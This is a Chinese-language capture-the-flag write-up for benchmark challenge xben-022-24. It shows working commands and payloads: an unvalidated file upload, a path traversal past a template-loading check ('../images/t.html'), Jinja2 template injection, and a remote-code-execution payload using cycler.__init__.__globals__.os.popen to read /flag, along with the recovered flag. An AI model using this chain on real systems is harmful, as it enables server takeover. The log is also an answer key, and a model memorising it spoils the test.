# xben-022-24 · 探索记录

对应题解：[`xben-022-24.md`](./xben-022-24.md)

## 目标与起点

容器 `10.0.173.136:80`，`Apache/2.4.67` 反代 Flask。
`GET /` → `302 /login`；登录页注释：

```html
<!-- TODO: Delete the testing account (test:test). -->
```

`test:test` 登录：`302 /home`，`Set-Cookie: session=eyJ1c2VyX2lkIjoxfQ…`。

导航五项：`/home`、`/profile`、`/error?error_type=…`、`/loan_details`、`/logout`。

## 第一阶段：摸清各处输入

| 位置 | 现象 |
| --- | --- |
| `/total_loan_payments?principal=&payment=&term=` | 回显 JSON（值经过型别转换与 HTML 转义） |
| `/update_profile` 的 `name` | 渲染到 `/home` 时被转义，`{{7*7}}` 原样显示 |
| `/update_profile` 的 `image_profile` | **文件上传，落到 `/static/images/`** |
| `/error?error_type=` | **按文件名加载模板并渲染** |

两个值得追的点：上传（无扩展名校验）和 `/error`（模板加载）。

## 第二阶段：`/error` 的越界检查

| error_type | 结果 |
| --- | --- |
| `not_implemented.html` | 200，渲染 |
| `../../../../etc/passwd` | **400** `Trying to load a template located ouside the static directory.` |
| `/etc/passwd` | 500（过了检查，Jinja 加载失败） |
| `not_implemented`（无扩展名） | 500 |

同时确认模板目录位置：`/static/templates/not_implemented.html` 返回 200。

## 第三阶段：上传一个会话自证文件

```bash
printf '{{7*7}}' > t.html
curl -b cj -F 'image_profile=@t.html;filename=t.html;type=text/html' … /update_profile
curl http://$T/static/images/t.html     # 200，内容是 {{7*7}}
```

上传无 MIME/扩展名校验，内容原样保存。

顺手试了让文件名穿越到 `templates/`：

| filename | 结果 |
| --- | --- |
| `../templates/t2.html` | 400（被拒） |
| `../../static/templates/t2.html` | 400 |
| `..%2ftemplates%2ft2.html` | 200，但文件没落到 templates（`/static/templates/t2.html` 404） |

## 第四阶段：兄弟目录 + 穿越

模板根是 `static/templates/`，图片目录是 `static/images/`——**兄弟目录**。
所以 `error_type=../images/t.html` 不需要离开 static：

| error_type | 结果 |
| --- | --- |
| `../images/t.html` | **200，页面出现 `49`** |
| `..%2fimages%2ft.html` | 200，49 |
| `%2e%2e/images/t.html` | 200，49 |
| `./../images/t.html` | 200，49 |
| `....//images/t.html` | 500 |
| `..././images/t.html` | 500 |
| `../../../../static/images/t.html` | 400（离开 static） |

SSTI 成立。

## 第五阶段：RCE 拿 flag

上传内容换成：

```jinja
{{ cycler.__init__.__globals__.os.popen('id; ls /; cat /flag').read() }}
```

渲染结果：

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
flag
flag{48359efb-b940-4db7-9ad0-62742b2865f8}
```

提交：`correct: true, awarded: 300`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `/update_profile` 的 `name` 做 SSTI | 无 | `{{7*7}}` 在 `/home` 原样显示（被转义） |
| `/total_loan_payments` 注入 | 无 | 值被转成数字并 HTML 转义（`1&#34;x`） |
| 文件名穿越把文件写进 `templates/` | 400 | 上传端对文件名做校验 |
| `error_type=../../../../etc/passwd` | 400 | 明确提示"离开 static 目录" |
| `error_type=/etc/passwd` 等绝对路径 | 500 | 过了检查但 Jinja 加载器不认 |
| 日志投毒（`/var/log/apache2/access.log`） | 500 | 路径不存在或不可读 |
| `....//`、`..././`、`..;/` | 500 | 归一化后指向不存在的路径 |

## 这次真正的收获

1. **把"可写目录"和"可执行上下文"并列看。** 上传只能到 `static/images`，
   模板只能从 `static/templates` 加载；单看任一处都不像漏洞，
   但两者是兄弟目录 → `../images/` 就是桥。
2. **越界检查的判据是"是否离开根"，不是"是否出现 `..`"。**
   `../images/` 留在 static 内所以放行，`../../..` 才被拒。
   这类实现很常见：先确定合法根，再在根内找"用户可写 + 会被执行"的组合。
3. **上传后先用 `{{7*7}}` 自证，再上 RCE。** 一次请求就能区分
   "文件没被当模板"和"payload 语法错"，避免在长 payload 上反复试错。
4. **上传端和加载端是两套过滤。** 上传端拦了文件名里的 `..`（400），
   加载端却允许 `..`（只要不离开根）。分开测才能发现这个不对称。
5. **Jinja2 与 Django 模板的利用链不同。** 009 是 Django（`{% debug %}`），
   本题是 Jinja2（`cycler.__init__.__globals__.os`）；
   语法、可用全局对象、报错样式都不一样，不能互相套用。
